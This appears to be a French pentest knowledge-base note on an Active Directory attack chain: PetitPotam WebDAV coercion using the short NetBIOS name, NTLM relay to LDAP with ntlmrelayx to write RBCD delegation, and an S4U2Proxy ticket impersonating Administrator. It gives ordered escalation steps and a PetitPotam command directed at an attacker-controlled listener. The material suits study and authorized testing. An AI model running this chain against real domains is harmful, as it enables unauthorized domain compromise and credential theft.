---
doc_kind: pattern
title: "Coercition WebDAV via NetBIOS court (pas FQDN) pour relais NTLM->LDAP RBCD"
category: misc
slug: intercept-webclient-coercion-ntlm-relay-rbcd
created: 2026-10-29
status: active
tags:
  - petitpotam
  - webclient-webdav
  - ntlm-relay-ldap
  - rbcd
  - s4u2proxy
  - adidns
chain_summary: "Pour forcer une authentification NTLM via WebClient/WebDAV exploitable par relais, cibler le nom NetBIOS COURT de la machine (le FQDN bascule sur Kerberos et echoue a produire un header NTLM) puis relayer vers LDAP avec --delegate-access pour ecrire une delegation RBCD."
---
# Coercition WebDAV via NetBIOS court (pas FQDN) pour relais NTLM->LDAP RBCD

## Chain Summary

- One-line chain: Pour forcer une authentification NTLM via WebClient/WebDAV exploitable par relais, cibler le nom NetBIOS COURT de la machine (le FQDN bascule sur Kerberos et echoue a produire un header NTLM) puis relayer vers LDAP avec --delegate-access pour ecrire une delegation RBCD.
- Typical target shape: Service WebClient actif sur la machine cible; capacite a coercer une authentification (PetitPotam/MS-EFSRPC ou equivalent); LDAP signing/channel binding faibles permettant le relais vers LDAP.

## Preconditions

- Service WebClient actif sur la machine cible; capacite a coercer une authentification (PetitPotam/MS-EFSRPC ou equivalent); LDAP signing/channel binding faibles permettant le relais vers LDAP.

## Cheap Probes

- Tester la coercition avec le nom NetBIOS court d'abord; si echec avec FQDN, c'est souvent parce que le FQDN declenche Kerberos.

## Telltale Evidence

- La coercition avec le nom NetBIOS court produit une authentification NTLM relayable, contrairement au FQDN.

## Escalation Order

1. Ajouter un enregistrement DNS/ADIDNS pointant vers l'IP attaquant si necessaire.
2. Lancer ntlmrelayx avec --delegate-access cible sur LDAP du DC, stdin maintenu ouvert.
3. Declencher la coercition en utilisant explicitement le nom NetBIOS court de la machine cible.
4. Une fois la delegation RBCD ecrite, forger un ticket S4U2Proxy impersonnant Administrator.
5. Utiliser ce ticket pour acceder a la machine cible.

## Common Mistakes

- Cibler le FQDN de la machine pour la coercition WebDAV au lieu du nom NetBIOS court, ce qui bascule l'authentification sur Kerberos et empeche le relais NTLM. Lancer ntlmrelayx sans maintenir stdin ouvert, le faisant quitter immediatement.

## Payload Shapes

```text
PetitPotam.py -d <domain> -u <user> -p <pass> 'attacker@80/x' <netbios-short-name>
```

## Related Writeups

- intercept-webclient-coercion-ntlm-relay-rbcd

## Skill Impact

- Related skill: pwn-triage/AD: ajouter le rappel NetBIOS-court-vs-FQDN pour toute coercition WebDAV, et stdin maintenu ouvert pour ntlmrelayx.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
